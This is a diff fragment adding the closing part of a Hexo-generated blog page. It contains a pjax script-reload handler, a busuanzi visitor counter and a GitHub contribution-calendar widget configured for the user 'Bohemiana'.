+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
+            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
+            var git_user ="Bohemiana";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
